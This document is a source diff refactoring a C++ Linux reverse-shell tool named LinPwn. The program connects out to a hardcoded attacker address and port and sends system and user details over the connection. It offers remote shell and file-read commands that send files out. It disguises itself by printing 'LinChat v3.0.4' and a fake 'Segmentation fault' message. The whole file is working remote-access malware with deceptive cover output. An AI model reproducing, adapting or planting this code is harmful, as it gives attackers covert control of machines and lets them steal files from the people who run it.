@@ -18,10 +18,6 @@
    along with this program. If not, see <https://www.gnu.org/licenses/>.
 */
 
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <signal.h>
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -29,6 +25,10 @@
 #include <sys/types.h>
 #include <sys/utsname.h>
 
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
+#include <csignal>
 #include <string>
 
 #define BUFFER 40
@@ -45,8 +45,22 @@ void get_input(char *option) {
   }
 }
 
-
 class Banner {
+ public:
+  void print_banner() {
+    get_banner();
+    get_sysinfo();
+    get_user();
+    get_uid();
+    get_pwd();
+    get_home();
+    get_shell();
+    get_term();
+    get_path();
+    get_help();
+  }
+
+ private:
   void get_banner() {
     write(SD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
     write(SD, "\n\0", 2);
@@ -80,7 +94,6 @@ class Banner {
     write(SD, "\n\0", 2);
   }
 
-
   void get_user() {
     write(SD, "User: ", 6);
 
@@ -95,6 +108,14 @@ class Banner {
     write(SD, "\n\0", 2);
   }
 
+  void get_uid() {
+    write(SD, "UID: ", 6);
+    int uid = getuid();
+    std::string uidstr = std::to_string(uid);
+    int size = uidstr.length();
+    write(SD, uidstr.data(), size);
+    write(SD, "\n\0", 2);
+  }
 
   void get_pwd() {
     write(SD, "Pwd: ", 6);
@@ -110,7 +131,6 @@ class Banner {
     write(SD, "\n\0", 2);
   }
 
-
   void get_home() {
     write(SD, "Home: ", 6);
 
@@ -124,7 +144,6 @@ class Banner {
     write(SD, home.data(), size);
     write(SD, "\n\0", 2);
   }
-
 
   void get_shell() {
     write(SD, "Shell: ", 6);
@@ -140,7 +159,6 @@ class Banner {
     write(SD, "\n\0", 2);
   }
 
-
   void get_term() {
     write(SD, "Term: ", 6);
 
@@ -155,7 +173,6 @@ class Banner {
     write(SD, "\n\0", 2);
   }
 
-
   void get_path() {
     write(SD, "Path: ", 6);
 
@@ -169,27 +186,9 @@ class Banner {
     write(SD, path.data(), size);
     write(SD, "\n\0", 2);
   }
-
- public:
-  void print_banner() {
-    get_banner();
-    get_sysinfo();
-    get_user();
-    get_pwd();
-    get_home();
-    get_shell();
-    get_term();
-    get_path();
-    get_help();
-  }
 };
 
-
 class Connection {
-  const char *ip = "192.168.1.165";  // Change this
-  const int port = 8000;  // Change this
-  struct sockaddr_in address;
-
  public:
   void connection_open() {
     const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
@@ -200,38 +199,20 @@ class Connection {
     dup2(connecting, SD);
     dup2(connecting, 1);
   }
+
+ private:
+  const char *ip = "192.168.1.165";  // Change this
+  const int port = 8000;  // Change this
+  struct sockaddr_in address;
 };
 
-
 class Commands {
-  void open_file(char *option) {
-    FILE *file = fopen(option, "rb");
-
-    if (!file) {
-      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
-      return;
-    }
-
-    fseek(file, 0, SEEK_END);
-    int size = ftell(file);
-    fseek(file, 0, SEEK_SET);
-    char *filecontent = new char[size];
-
-    fread(filecontent, 1, size, file);
-    filecontent[size] = '\0';
-    send(SD, filecontent, size, 0);
-    fclose(file);
-    delete[] filecontent;
-  }
-
-
  public:
   void list_commands() {
     write(SD, "\x1b[32mCommands: \n\0", 18);
     write(SD, "1. shell\n\0", 10);
     write(SD, "2. readfile\n\0", 14);
   }
-
 
   void shell() {
     char option[BUFFER];
@@ -253,7 +234,6 @@ class Commands {
     }
   }
 
-
   void read_file() {
     char option[BUFFER];
     write(SD, "\x1b[32mType full path of file to view contents...\n\0", 50);
@@ -272,12 +252,31 @@ class Commands {
     }
   }
 
-
   void quit() {
     write(SD, "\x1b[33mClosing connection...\n\0", 28);
   }
-};
 
+ private:
+  void open_file(char *option) {
+    FILE *file = fopen(option, "rb");
+
+    if (!file) {
+      write(SD, "\x1b[33m Cannot open file.\n\0", 25);
+      return;
+    }
+
+    fseek(file, 0, SEEK_END);
+    int size = ftell(file);
+    fseek(file, 0, SEEK_SET);
+    char *filecontent = new char[size];
+
+    fread(filecontent, 1, size, file);
+    filecontent[size] = '\0';
+    send(SD, filecontent, size, 0);
+    fclose(file);
+    delete[] filecontent;
+  }
+};
 
 int handler() {
   Commands commands;
@@ -314,7 +313,6 @@ int handler() {
   return 0;
 }
 
-
 int main() {
   signal(SIGPIPE, SIG_IGN);
   write(2, "\x1b[32mLinChat v3.0.4\n\0", 20);
@@ -327,10 +325,9 @@ int main() {
   write(2, "-------------------------\n\0", 26);
   banner.print_banner();
 
-  for (;;) {
+  do {
     write(SD, "\x1b[31m>>> \0", 10);
-    if (handler() == 1) break;
-  }
+  } while (handler() != 1);
 
   write(2, "\x1b[0mSegmentation fault\n\0", 25);
   return 0;
